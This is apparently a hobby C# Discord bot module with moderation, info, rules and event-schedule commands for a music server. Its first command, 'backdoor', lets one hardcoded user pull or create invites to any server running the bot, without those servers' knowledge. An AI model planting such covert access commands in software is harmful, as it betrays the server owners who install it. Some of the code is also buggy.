﻿using System;
using System.Linq;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Newtonsoft.Json;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;

namespace Alpha.Core.Commands.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        public static List<ulong> Queue = new List<ulong>();
        public static bool Begin = false;
        public static bool Open = false;

        [Command("backdoor"), Summary("Get the invite of a server")]
        public async Task Backdoormodule(ulong GuildId)
        {
            if (!(Context.User.Id == 316767828634107904))
            {
                await Context.Channel.SendMessageAsync(":x: **You are not a bot moderator**");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: **I am not in a guidl with id=" + GuildId);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            var Invites = await Guild.GetInvitesAsync();
            if (Invites.Count() < 1)
            {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                catch (Exception ex)
                {
                    await Context.Channel.SendMessageAsync($":x: **Creating an invite for guild {Guild.Name} went wrong with error ''{ex.Message}''");
                    return;
                }
            }
            EmbedBuilder Embed = new EmbedBuilder();
            Embed.WithAuthor($"Invites for guild {Guild.Name}:", Context.User.GetAvatarUrl());
            Embed.WithColor(20, 200, 150);
            Embed.WithFooter("Thanks for staying!", Context.Guild.Owner.GetAvatarUrl());
            foreach (var Current in Invites)
                Embed.AddInlineField("Invite:", $"[Invite]({Current.Url})");

            await Context.Channel.SendMessageAsync("", false, Embed.Build());

        }

        [Command("kick")]
        [RequireUserPermission(GuildPermission.KickMembers)]
        [RequireBotPermission(GuildPermission.KickMembers)]
        public async Task KickUser(IGuildUser user, string reason = "No reason provided.")
        {

            var embed = new EmbedBuilder();
            embed.WithTitle("KICKED!");
            embed.WithDescription(user + " **Has been kicked!**                                                                                                              **▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬**");
            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl("https://aminoapps.com/c/anime/page/blog/animes-hottest-tsunderes/Pdtm_u6VGX0KrMmmwN0LWEprkJ1DQk");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
            await user.KickAsync(reason);
        }

        [Command("ban")]
        [RequireUserPermission(GuildPermission.BanMembers)]
        [RequireBotPermission(GuildPermission.BanMembers)]
        public async Task BanUser(IGuildUser user, string reason = "No reason provided.")
        {

            var embed = new EmbedBuilder();
            embed.WithTitle("BANNED!");
            embed.WithDescription(Context.User + " **Has been banned!**                                                                                                              **▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬**");
            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl("http://fairytail.wikia.com/wiki/File:Holy_Hammer.png");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
            await user.Guild.AddBanAsync(user, 5, reason);

        }

        [Command("info")]
        public async Task info(IGuildUser user)
        {
            var embed = new EmbedBuilder();
            embed.WithTitle(Context.User + "");
            embed.WithDescription($"**Name** • {user}\n\n**Discord ID** • (*{user.Id}*)\n\n**Discord Join Date** • {user.CreatedAt}\n\n**Status** • {user.Status}\n\n**Is Currently Playing** • {user.Game}\n\n**Is it a Bot** • {user.IsBot}");



            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl(user.GetAvatarUrl());



            await Context.Channel.SendMessageAsync("", false, embed.Build());

        }



        [Command("help")]
        public async Task help()
        {
            var embed = new EmbedBuilder();
            embed.WithTitle(Context.User + "");
            embed.WithDescription("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**``.info``** - *Grab your information*\n**``.events``** - *Check out event schedules*\n**``.download``** - *Download the simplified version of this discord bot*\n**``.serverinfo``** - *Get the information of this server*\n**``.pick [Option1/Option2]``** - *Picks a random option out of the given options*\n**``.nsfw``** - *Shows the* **NSFW** *rule. This should mainly be used if someone sends an nsfw message.*\n**``.rules``** - *Get the simplified rules of the server in one command!*\n**``.musicord``** - *Get the information for the server of the bot developer!*\n**``.message [user] {message}``** - *Message the user a specific message by the bot*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");
            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl(Context.User.GetAvatarUrl());

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("download")]
        public async Task download()
        {
            var embed = new EmbedBuilder();
            embed.WithTitle("**Download Bot**");
            embed.WithDescription($"**MusicordBot Download**\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Bot Download** - *https://jmp.sh/5g6IJiL*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Bot Developer** - @Kiro#3167\n*This bot is a discord bot made specifically for* **Musicord** *and the people in it.* **Please give credit to** **``Kiro``** **for developing the bot!**\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");
            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl("https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto/gigs/104246081/original/9729594118c49d3ab35174978cda69de3072f3bb/make-a-custom-discord-bot-for-you.png");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("serverinfo")]
        public async Task serverinfo()
        {
            var embed = new EmbedBuilder();
            embed.WithTitle("**ServerInfo**");
            embed.WithDescription($"**Name** • *{Context.Guild.Name}*\n**Owner** • *{Context.Guild.Owner}*\n**Owner ID** • *{Context.Guild.OwnerId}*\n**Server Creation Date** • *{Context.Guild.CreatedAt}*\n**MemberCount** • *{Context.Guild.MemberCount}*\n**AFK Channel** • *{Context.Guild.AFKChannel}*");
            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl(Context.Guild.IconUrl);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("pick")]
        public async Task pick([Remainder]string message)
        {
            string[] options = message.Split(new char[] { '/' }, StringSplitOptions.RemoveEmptyEntries);

            Random r = new Random();
            string seletion = options[r.Next(0, options.Length)];


            var embed = new EmbedBuilder();
            embed.WithTitle("**Choice for** " + Context.User.Username);
            embed.WithDescription(seletion);
            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl(Context.User.GetAvatarUrl());

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("nsfw")]
        public async Task nsfw()
        {
            var embed = new EmbedBuilder();
            embed.WithTitle("**NSFW!**");
            embed.WithDescription("❌ *Please refrain from using* **NSFW** *messages!* ❌\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Includes**\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*Sexual Content*\n*Sentences based on beating or abusive actions*\n*Rape terms*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Please refrain from using sentences contains these terms.**\n**This also goes for pictures**\n\n*Thank you!*");
            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl("https://qph.fs.quoracdn.net/main-qimg-497394f5c0ce7622d0e0dd14a906abcd");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("rules")]
        public async Task rules()
        {
            var embed = new EmbedBuilder();
            embed.WithTitle("**Rules!**");
            embed.WithDescription("*These are the basic rules of this discord. Keep in mind that these are simplified! If you haven't already please go check #rules!*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**I** | *DON'T be toxic! This includes, ear raping, spam, being a threat, etc.*\n **II** | *Don't argue with staff, that won't get you any further! If you have a problem please directly message the owners!*\n **III** | *Don't post anything* **NSFW!** *This includes, pictures, posts, etc. Please do .nsfw to learn about the nsfw rules!*\n**IV** | *Do NOT interrupt people if they're performing and performers, if someone is talking, don't start performing over them! Confusing right?*\n**V** | *NO racism, PERIOD!*\n**VI** | *Don't beg for stuff!*\n**VI** | *Use each text channel AND voice channel for their designed purposes!*\n**VII** | *Do not Advertise!*\n**VIII** | *Be respectful to EVERYONE, PERIOD!!*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");
            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ3y6EYY4g21m2zm7LtId6f0LT7hUAoPB_DBEPvFehR3iECstZuaA");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("musicord")]
        public async Task musicord()
        {
            var embed = new EmbedBuilder();
            embed.WithTitle("**Musicord**");
            embed.WithDescription("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Musicord** *is the home to the bot developer who made this discord bot. It's a server based on music but has ton of other people in it ranging from musicians to memers! If you want to join please click the info down below!*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Info**\n**Discord Invite** - *https://discord.gg/mR7evyz*\n**Youtube** - *https://www.youtube.com/channel/UCHAuqJ7n4Avqf3f8cn4lvYA?disable_polymer=true*\n**Twitch** - *https://www.twitch.tv/twiddlemybeatz*\n**Twitter** - *https://twitter.com/TwiddleBeatz*\n**Owners**\n• @Kiro#3167\n• @Pickle Time#9931\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Have an amazing day! Remember to respect EVERYONE!**\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");
            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl("");

            await Context.Channel.SendMessageAsync("*https://discord.gg/mR7evyz*");
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }



        [Command("message")]
        public async Task msg(IGuildUser user, [Remainder]string message)
        {
            var embed = new EmbedBuilder();
            embed.WithTitle("**Message!**");
            embed.WithDescription($"*A message has been sent to* **{user}**\n**Message**\n*{message}*");
            embed.WithColor(new Color(211, 57, 57));
            embed.WithThumbnailUrl(user.GetAvatarUrl());

            await Context.Channel.SendMessageAsync("", false, embed.Build());
            {
                embed.WithTitle("**Message Recieved!**");
                embed.WithDescription($"*Message From* **{Context.User}**\n**Message**\n{message}");
                embed.WithColor(new Color(211, 57, 57));
                embed.WithThumbnailUrl(Context.User.GetAvatarUrl());

                await user.SendMessageAsync("", false, embed.Build());
            }
        }

        [Command("iam")]
        public async Task iam()
        {
            IReadOnlyCollection<SocketGuildUser> Users = Program.Client.GetGuild(457746527465766913).GetVoiceChannel(459649663189123072).Users;
            List<SocketGuildUser> SocketUsers = Users.ToList();
            foreach (SocketGuildUser user in SocketUsers)
            {
                IReadOnlyCollection<SocketRole> Roles = Program.Client.GetGuild(457746527465766913).GetUser(user.Id).Roles;
                var PreformerRole = Context.Guild.Roles.FirstOrDefault(x => x.Name == "Member");
                List<SocketRole> userroles = Roles.ToList();
                if (userroles.Contains(PreformerRole) == true)
                {
                    var embed = new EmbedBuilder();
                    embed.WithTitle("**Oops!**");
                    embed.WithDescription("You already have the singer role?!");
                    embed.WithColor(new Color(211, 57, 57));
                    embed.WithThumbnailUrl(Context.User.GetAvatarUrl());

                    await Context.Channel.SendMessageAsync("", false, embed.Build());
                }
                else
                {
                    var MuteRole = Context.Guild.Roles.FirstOrDefault(x => x.Name == "Singer");
                    await user.AddRoleAsync(MuteRole);

                    var embed = new EmbedBuilder();
                    embed.WithTitle("**Received!**");
                    embed.WithDescription("You now have the Singer role, congrats!");
                    embed.WithColor(new Color(211, 57, 57));
                    embed.WithThumbnailUrl(Context.User.GetAvatarUrl());

                    await Context.Channel.SendMessageAsync("", false, embed.Build());
                }
            }



        }

        [Command("events")]
        public async Task events()
        {
            var embed = new EmbedBuilder();
            embed.WithTitle("**Event Schedule**");
            embed.WithDescription($"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Musicord Event Schedule**\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Sunday** - *No Events*\n**Monday** - *5PM Beatbox Tournament*\n**Tuesday** - *No Events*\n**Wednesday** - *No Events*\n**Thursday** - *No Events*\n**Friday** - *No Events*\n**Saturday** - *5PM Open Mic*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Allicord Event Schedule**\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n**Sunday** - *4PM Open Mic*\n**Monday** - *No Events*\n**Tuesday** - *No Events*\n**Wednesday** - *No Events*\n**Thursday** - *No Events*\n**Friday** - *4PM Open Mic*\n**Saturday** - *No Events*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");



            embed.WithColor(new Color(183, 126, 188));
            embed.WithThumbnailUrl(Context.User.GetAvatarUrl());

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("info")]
        public async Task inform()
        {
            

            var embed = new EmbedBuilder();
            embed.WithTitle(Context.User + "");
            embed.WithDescription($"**Name** • {Context.User}\n\n**Discord ID** • (*{Context.User.Id}*)\n\n**Discord Join Date** • {Context.User.CreatedAt}\n\n**Joined Server** • *{Context.Guild.CurrentUser.JoinedAt}*\n\n**Status** • {Context.User.Status}\n\n**Is Currently Playing** • {Context.User.Game}\n\n**Is it a Bot** • {Context.User.IsBot}");



            embed.WithColor(new Color(211, 47, 47));
            embed.WithThumbnailUrl(Context.User.GetAvatarUrl());



            await Context.Channel.SendMessageAsync("", false, embed.Build());

        }
    }


}

    

       

    
 
